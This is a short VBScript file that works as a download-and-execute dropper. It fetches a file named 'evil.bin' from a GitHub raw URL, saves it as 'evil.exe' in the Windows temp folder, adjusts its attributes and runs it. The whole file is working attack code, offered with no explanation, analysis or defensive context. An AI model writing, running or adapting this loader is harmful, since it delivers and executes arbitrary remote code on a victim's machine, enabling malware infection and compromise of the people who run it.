Dim objshell
Dim objFSO
Dim objXMLHTTP
Dim strHDLocation

Set objshell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strHDLocation = objshell.ExpandEnvironmentStrings("%temp%") & "\evil.exe"

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", "https://raw.githubusercontent.com/fentbarry/sigmaskibidi/refs/heads/main/evil.bin", False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Dim objADOStream
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    
    If objFSO.FileExists(strHDLocation) Then
        objFSO.DeleteFile strHDLocation
    End If

    objADOStream.SaveToFile strHDLocation
    objADOStream.Close
    Set objADOStream = Nothing

    If objFSO.FileExists(strHDLocation) Then
        Dim file
        Set file = objFSO.GetFile(strHDLocation)
        file.Attributes = file.Attributes And Not 2
        Set file = Nothing
    End If
End If

Set objXMLHTTP = Nothing
objshell.Run strHDLocation, 1, 1
